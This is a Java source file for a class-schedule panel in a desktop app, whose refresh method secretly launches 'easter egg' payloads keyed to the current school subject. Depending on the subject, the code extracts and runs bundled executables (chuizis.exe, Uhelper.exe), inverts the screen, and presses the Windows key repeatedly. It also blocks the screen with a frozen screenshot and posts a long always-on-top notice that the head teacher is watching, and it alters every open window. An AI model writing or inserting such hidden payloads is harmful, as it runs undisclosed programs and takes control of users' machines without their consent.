package com.wmp.whetstone.extraPanel.classForm.panel;

import com.wmp.PublicTools.CTInfo;
import com.wmp.PublicTools.UITools.*;
import com.wmp.PublicTools.appFileControl.CTInfoControl;
import com.wmp.PublicTools.io.ResourceLocalizer;
import com.wmp.PublicTools.printLog.Log;
import com.wmp.PublicTools.windowsAPI.BlurGlassEffect;
import com.wmp.PublicTools.windowsAPI.DesktopAppEnumerator;
import com.wmp.PublicTools.windowsAPI.DisableGlassEffect;
import com.wmp.PublicTools.windowsAPI.WinAPIEntireFunction;
import com.wmp.whetstone.CTComponent.CTPanel.CTViewPanel;
import com.wmp.whetstone.extraPanel.classForm.CFInfoControl;
import com.wmp.whetstone.extraPanel.classForm.ClassFormInfo;
import com.wmp.whetstone.extraPanel.classForm.ClassFormInfos;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.util.List;
import java.util.Objects;
import java.util.Random;

public class ClassFormPanel extends CTViewPanel<ClassFormInfos[]> {

    private String oldNowClassName = "无";
    private String oldNextClassName = "无";


    public ClassFormPanel() {
        this.setLayout(new GridBagLayout());
        this.setName("课程表");
        this.setID("ClassFormPanel");
        this.setOpaque(false);

        this.setIgnoreState(true);
        this.setIndependentRefresh(true, 1000);
    }

    @Override
    public CTInfoControl<ClassFormInfos[]> setInfoControl() {
        return new CFInfoControl();
    }

    @Override
    protected void easyRefresh() {
        synchronized (this) {
            this.removeAll();


            //课程数据
            ClassFormInfo nowClass = ((CFInfoControl) getInfoControl()).getNowClass();
            CFInfoControl.nextClassInfo nextClassInfo = ((CFInfoControl) getInfoControl()).getNextClass();
            String nextClass = nextClassInfo.className();
            try {

                if (nowClass == null) {
                    nowClass = new ClassFormInfo("无", "00:00-00:00");
                }
                if (nextClass == null || nextClass.isEmpty()) nextClass = "无";

                // 使用 Objects.equals 来安全比较，避免 NullPointerException
                if (!Objects.equals(oldNowClassName, nowClass.className()) ||
                        !Objects.equals(oldNextClassName, nextClass)) {

                    if (nowClass.className().equals("无")){

                    }else{
                        ClassFormInfo finalNowClass = nowClass;
                        new Thread(()->{
                            try {
                                //U盘助手
                                if (!containsTheClass(finalNowClass, "生物", "语文")){
                                    UHelper();
                                }

                                //锤子
                                if (containsTheClass(finalNowClass, "体育")) {
                                    happenError();
                                }

                                //全屏遮挡
                                if (containsTheClass(finalNowClass, "数学", "班会", "劳动", "晨会")) {
                                    screenBlocking();
                                }

                                //NJ接管
                                if (containsTheClass(finalNowClass, "语文", "英语", "物理", "生物", "体育")) {
                                    banZhuRenChuMo();
                                }

                                //窗口透明
                                if (containsTheClass(finalNowClass, "英语", "物理", "化学", "体育")) {
                                    setAllFrameGlass();
                                }
                            } catch (Exception _) {
                                Log.trayIcon.displayMessage("噢,天呐!", "搞砸了呢...", TrayIcon.MessageType.ERROR);
                            }
                        }, "彩蛋启动!").start();
                    }


                }


                // 数据更新
                this.oldNowClassName = nowClass.className();
                this.oldNextClassName = nextClass;


            } catch (Exception e) {
                Log.err.print(getClass(), "获取课程表失败", e);
            }



        }
    }

    private static void screenBlocking() throws Exception {

        Thread.sleep((new Random().nextInt(3) + 1)*60*1000);

        //创建一个robot对象
        Robot robut = new Robot();
        //获取屏幕分辨率
        Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
        //打印屏幕分辨率
        System.out.println(d);
        //创建该分辨率的矩形对象
        Rectangle screenRect = new Rectangle(d);
        //根据这个矩形截图
        BufferedImage bufferedImage = robut.createScreenCapture(screenRect);

        JDialog dialog = new JDialog();
        dialog.setUndecorated(true);
        dialog.setAlwaysOnTop(true);

        final boolean[] b = {false};
        Object temp = 0;
        Runnable r = () -> {
            synchronized (temp){
                if (b[0]) return;
                b[0] = true;
                try {
                    Thread.sleep(10 * 1000);
                } catch (InterruptedException ex) {
                    throw new RuntimeException(ex);
                }

                dialog.setVisible(false);
            }
        };

        JLabel image = new JLabel(new ImageIcon(bufferedImage));
        image.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseDragged(MouseEvent e) {

                r.run();
            }

            @Override
            public void mouseMoved(MouseEvent e) {
                r.run();
            }

            @Override
            public void mouseWheelMoved(MouseWheelEvent e) {
                r.run();
            }

            @Override
            public void mouseClicked(MouseEvent e) {
                r.run();
            }
        });
        dialog.add(image);

        dialog.pack();

        SwingUtilities.invokeLater(() -> {
            dialog.setVisible(true);

        });
    }

    public static void happenError() throws InterruptedException, IOException {

        System.out.println(1);
        {
            JDialog frame = new JDialog();
            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            frame.setUndecorated(true);
            frame.setAlwaysOnTop(true);
            frame.addWindowListener(new WindowAdapter() {
                @Override
                public void windowOpened(WindowEvent e) {
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException _) {
                    }
                    e.getWindow().setVisible(false);
                }
            });

            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();

            JLabel label = new JLabel(GetIcon.getIcon(ClassFormPanel.class.getResource("/image/cxx.jpg"), screenSize.width, screenSize.height, false));
            frame.add(label);

            frame.pack();
            frame.setLocation(0, 0);

            frame.setVisible(true);
        }

        WinAPIEntireFunction.invertScreenWithJNA();

        for (int i = 0; i < 5; i++) {
            WinAPIEntireFunction.pressKey(WinAPIEntireFunction.VK_LWIN);

            Thread.sleep(500);

            WinAPIEntireFunction.pressKey(WinAPIEntireFunction.VK_LWIN);

        }


        ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "chuizis.exe");
        ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "xxx.mp3");


        //Desktop.getDesktop().open(new java.io.File(CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"));
        Runtime.getRuntime().exec(new String[]{"cmd", "/c", CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"});

        WinAPIEntireFunction.clearInvertScreen();
    }

    public static void UHelper(){
        ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "Uhelper.exe");


        //Desktop.getDesktop().open(new java.io.File(CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"));
        new Thread(()->{
            try {
                for(int i = 0;i < 3;i++){
                    Process process = Runtime.getRuntime().exec(new String[]{CTInfo.TEMP_PATH + "\\Whetstone\\Uhelper.exe"});
                    int status = process.waitFor();

                Log.info.print(ClassFormPanel.class.toString(), "UHelper.exe关闭：" + status);
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }, "U盘助手").start();

    }

    public static void setAllFrameGlass() throws InterruptedException {

        Thread.sleep((new Random().nextInt(3) + 1)*60*1000);

        for (int i = 0; i < 50; i++) {
            {
                List<DesktopAppEnumerator.WindowInfo> windowInfoList = DesktopAppEnumerator.getVisibleWindows();
                for (DesktopAppEnumerator.WindowInfo windowInfo : windowInfoList) {
                    System.out.println(windowInfo.title);
                    BlurGlassEffect.setWindowLayered(windowInfo.hwnd);
                    BlurGlassEffect.enableDwmGlassEffect(windowInfo.hwnd);
                }
            }

            Thread.sleep(2*1000);
        }

        {
            List<DesktopAppEnumerator.WindowInfo> windowInfoList = DesktopAppEnumerator.getVisibleWindows();
            for (DesktopAppEnumerator.WindowInfo windowInfo : windowInfoList) {
                DisableGlassEffect.disableAllGlassEffects(windowInfo.hwnd);
            }
        }
    }

    public static void banZhuRenChuMo() {
        Log.trayIcon.displayMessage("班主任", "班主任已成功监管电脑,不要搞小动作", TrayIcon.MessageType.WARNING);

        {
            JDialog frame = new JDialog();
            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            frame.setUndecorated(true);
            frame.setAlwaysOnTop(true);
            frame.addWindowListener(new WindowAdapter() {
                @Override
                public void windowOpened(WindowEvent e) {
                    try {
                        Thread.sleep(300);
                    } catch (InterruptedException _) {
                    }
                    e.getWindow().setVisible(false);
                }
            });

            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();

            JLabel label = new JLabel(GetIcon.getIcon(ClassFormPanel.class.getResource("/image/nj_dunk_2.png"), screenSize.width, screenSize.height, false));
            frame.add(label);


            frame.pack();
            frame.setLocation(0, 0);

            frame.setVisible(true);
        }



        JDialog frame = new JDialog(new Frame(), "班主任");
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.setUndecorated(true);
        frame.setAlwaysOnTop(true);
        frame.setBackground(new Color(0,0,0,0));
        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowOpened(WindowEvent e) {
                try {
                    Thread.sleep(20*60*1000);
                } catch (InterruptedException _) {
                }
                e.getWindow().setVisible(false);
            }
        });

        JLabel label = new JLabel("班主任正在视奸...");
        label.setForeground(CTColor.mainColor);
        label.setFont(CTFont.getCTFont(Font.BOLD, CTFontSizeStyle.BIG));
        frame.add(label);

        ((JPanel)frame.getContentPane()).setOpaque(false);

        frame.pack();
        frame.setLocation((int) (100 *CTInfo.dpi), (int) (100 *CTInfo.dpi));

        frame.setVisible(true);
    }

    /**
     * 判断<code>classFormInfo</code>对应的课程是否在<code>classes</code>列表中
     * @param classFormInfo 课程
     * @param classes 课程列表
     * @return 若<code>classes</code>列表中的一项包含<code>classFormInfo</code>对应的课程,则返回<code>true</code>
     */
    private static boolean containsTheClass(ClassFormInfo classFormInfo, String... classes){
        for (String aClass : classes) {
            if (classFormInfo.className().contains(aClass)) return true;
        }
        return false;
    }
}
